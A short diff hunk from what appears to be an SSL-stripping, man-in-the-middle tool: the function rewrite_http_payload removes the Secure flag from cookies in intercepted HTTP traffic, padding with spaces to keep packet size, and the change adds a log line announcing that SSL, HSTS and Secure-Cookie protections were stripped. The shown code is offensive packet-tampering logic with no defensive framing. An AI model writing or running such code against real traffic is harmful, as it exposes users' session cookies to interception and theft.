@@ -146,5 +146,5 @@ def rewrite_http_payload(raw_payload: bytes) -> bytes:
     # 3. Cookie Access: Strip Secure flag
     # ; Secure (8 bytes) -> ;        (8 bytes)
     payload = re.sub(b'; Secure', b';       ', payload, flags=re.IGNORECASE)
-
+    print(f"[+] Successfully stripped SSL/HSTS/Secure-Cookie from packet (Size: {len(payload)})")
     return payload
